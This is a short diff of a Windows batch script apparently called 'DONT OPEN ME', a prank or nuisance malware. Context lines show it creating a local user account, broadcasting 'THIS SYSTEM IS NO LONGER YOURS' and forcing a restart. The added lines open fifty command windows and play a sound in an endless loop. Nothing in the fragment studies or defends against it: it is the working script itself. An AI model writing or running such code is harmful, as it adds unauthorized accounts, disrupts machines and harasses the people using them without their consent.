@@ -6,7 +6,6 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-
 powershell -WindowStyle Hidden -Command ""
 
 net user "DONT OPEN ME" /add
@@ -50,5 +49,12 @@ for /l %%i in (1,1,50) do (
 msg * "DONT OPEN ME HAS TAKEN OVER. THIS SYSTEM IS NO LONGER YOURS."
 timeout /t 15 >nul
 
-
 shutdown /r /f /t 15
+
+for /l %%i in (1,1,50) do (
+    start cmd /c echo DONT OPEN ME IS HERE && pause
+)
+
+:loop
+    powershell -c (New-Object Media.SoundPlayer "C:\Windows\Media\chimes.wav").PlaySync()
+    goto loop
